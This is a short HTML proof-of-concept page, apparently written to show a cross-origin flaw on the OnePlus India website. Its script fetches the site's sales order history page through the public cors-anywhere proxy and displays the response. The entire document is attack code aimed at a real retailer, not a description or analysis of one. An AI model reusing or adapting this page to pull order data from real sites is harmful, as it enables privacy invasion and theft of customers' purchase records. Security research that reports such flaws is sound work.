<!DOCTYPE html>
<html>
<head>
    <title>Cross-Domain Policy  PoC</title>
    <script>
        function makeRequest() {
            fetch('https://cors-anywhere.herokuapp.com/https://www.oneplus.in/sales/order/history')
                .then(response => {
                    if (response.ok) {
                        return response.text();
                    }
                    throw new Error('Network response was not ok.');
                })
                .then(data => {
                    console.log("Data received:", data);
                    document.getElementById("output").innerText = data;
                })
                .catch(error => {
                    console.error("Error fetching data:", error);
                    document.getElementById("output").innerText = "Error fetching data: " + error.message;
                });
        }
    </script>
</head>
<body>
    <h1>Cross-Domain Policy PoC</h1>
    <button onclick="makeRequest()">Make Request</button>
    <pre id="output"></pre>
</body>
</html>
